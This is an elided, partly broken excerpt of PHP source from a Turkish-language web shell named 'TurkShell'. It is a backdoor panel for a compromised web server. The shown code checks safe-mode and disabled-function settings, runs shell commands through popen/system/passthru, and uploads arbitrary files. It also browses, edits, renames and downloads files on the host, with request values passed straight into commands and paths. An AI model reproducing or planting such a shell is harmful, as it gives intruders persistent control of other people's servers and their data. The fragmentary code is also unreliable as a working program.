...
{
    print"<center><table bgcolor=Maroon  style='border:1px red  ' width=99% height=2%>";
    print"<tr><td><b><center><font size=3 color=red >$delmtxt</td></tr></table></center>";
}
...
function callshsrc($showsc)
{
    if (isset($showsc)&&filesize($showsc)=="0") {
        ...
        if (!show_source($showsc)||!function_exists('show_source')) {
            print "<center><font color=white size=2><b>[ Sorry can't complete the operation ]</font></center>";
            die();
        }
        print "</td></tr></table>";
        die();
    ...
    print "<p><b>: TurkShell Php editörüyle istediğiniz bir php dosyasını görüntüleyebilmek için, dosya adını bütün dizinleriyle beraber yazınız. :";
...
if ($dlink=='cmdhlp') {
    print "<p><b>: Komutu Aşağıya Ekle ve Biz Ne İşe Yaradığı Hakkında Yardımcı Olalım :";
    print "<form method=get>";
    input("text", "hlp", "", 35);
    print " ";
    input("submit", "", "Yardım", "");
...
if (isset($_REQUEST['hlp'])) {
    ...
    print "<p><table width=100% height=30% bgcolor=#FF0000 border=2><tr><td>";
...
!function_exists(popen)&&!function_exists(system)&&!function_exists(passthru)) {
        ...
        if (!callfuncs("man $hlp | col -b")) {
            print "<center><font size=2><b>[ Bitti. ]";
        }
        print "</pre></font>";
    }
    print "</td></tr></table>";
...
function inisaf($iniv)
{
    ...
    if (($chkini || strtolower($chkini)) !=='on') {
        print"<font color=red ><b>Safe Mod Kapalı Gözüküyor. Ancak Engelli Fonksiyonlar Bulunabilir.</b></font>";
    } else {
        print"<font color=red><b>Açık ( Güvenli )</b></font>";
    }
}function inifunc($inif)
{
    $chkin=ini_get($inif);
    if ($chkin=="") {
        print " <font color=red><b>Yok</b></font>";
    } else {
        $nchkin=wordwrap($chkin, 40, "\n", 1);
        print "<b><font color=red  >".$nchkin."</font></b>";
    }
}function callocmd($ocmd, $owhich)
{
    ...
    if ($nval=$owhich) {
        ...
        print"<font color=red  ><b>OFF</b></font>";
    }
}
    ...
    public function upload($file, $tmp)
    {
        ...
        if (isset($_REQUEST["up"])) {
            ...
            if (@copy($tmp, $nscdir."/".$file)) {
                print "<div><center><b><font color=red  > $file </font>dosyası başarıyla yüklenmiştir.</b></center></div>";
            } else {
...
!isset($_REQUEST['rfiletxt'])) {
    if ($dh  = dir($nscdir)) {
        ...
        print "<center><b>Dosyalar";
        print "</td>";
        print "<td width=8% style=\"border:1px solid white\">";
        print "<center><b>Boyutlar";
        print "</td>";
        print "<td width=3% style=\"border:1px solid white\">";
        print "<center><b>Yazma";
        print "</td>";
        print "<td width=3% style=\"border:1px solid white\">";
        print "<center><b>Okuma";
        print "</td>";
        print "<td width=5% style=\"border:1px solid white\">";
        print "<center><b>Tür";
        print "</td>";
        print "<td width=5% style=\"border:1px solid white\">";
        print "<center><b>Düzenleme";
        print "</td>";
        print "<td width=5% style=\"border:1px solid white\">";
        print "<center><b>Adlandırma";
        print "</td>";
        print "<td width=6% style=\"border:1px solid white\">";
        print "<center><b>İndir";
        print "</td>";
        ...
        foreach ($files as $nfiles) {
            ...
            if (is_dir($nfiles)) {
                print "<font face= tahoma size=2 color=red  >[ $nfiles    ]<br>";
            } else {
                print "<font face= tahoma size=2 color=#FF0000>$nfiles <br>";
            }
            print"</td>";
            ...
            print "<td style=\"border:1px solid white\">";
            if (is_file("$nscdir/$nfiles")) {
                print " <center><a href=".inclink('dlink', 'edit')."&edit=$nfiles&scdir=$nscdir>Düzenle</a>";
            } else {
                print "<center><font face=tahoma size=2 color=gray>Düzenle</center>";
            }
            print"</td>";
            print "<td style=\"border:1px solid white\">";
            print " <center><a href=".inclink('dlink', 'ren')."&ren=$nfiles&scdir=$nscdir>Adlandir</a>";
            print"</td>";
            print "<td style=\"border:1px solid white\">";
            if (is_file("$nscdir/$nfiles")) {
                print " <center><a href=".inclink('dlink', 'dwld')."&dwld=$nfiles&scdir=$nscdir>indir</a>";
            } else {
        ...
        print "<div><br><center><b>[ İzin Verilmiyor. ]<p>";
    }
...
function rdread($nscdir, $sf, $ef)
{
    ...
    if (is_readable($rfile)&&is_file($rfile)) {
        ...
        if (is_writable($rfile)) {
            print "<center><input type=hidden value=$rfile name=hidrfile><input type=submit value='Kaydet' > <input type=reset value='Reset' ></center>".$ef;
        } else {
            print "<div><b><center>[ Can't edit <font color=red  >".basename($rfile)."</font> ]</center></b></div><br>";
        }
        print "</center><br>";
    } elseif (!file_exists($_REQUEST['rfile'])||!is_readable($_REQUEST['rfile'])||$_REQUEST['rfile']=$nscdir) {
        print "<div><b><center>[ Safe Mod kapalı olduğu halde, engelli fonksiyonlar bulunduğundan dolayı isteğinize cevap verilememektedir. ]</center></b></div><br>";
    }
}
...
if (isset($_REQUEST['ren'])&&isset($_REQUEST['renf'])) {
    if (rename($nscdir."/".$_REQUEST['ren'], $nscdir."/".$_REQUEST['renf'])) {
        ...
        print "<div><b><center>[<a href=".inclink('dlink', 'rcurrdir')."&scdir=$nscdir> Geri </a>]</div>";
        die();
    }
...
}function svetxt()
{
    ...
    if (is_writable($_REQUEST['edit'])) {
        ...
        fwrite($fp, $nedittxt);
        print "<div><b><center>[ <font color=red  >".basename($_REQUEST['edit'])."</font> Saved !! ]</center></b></div>";
        fclose($fp);
    } else {
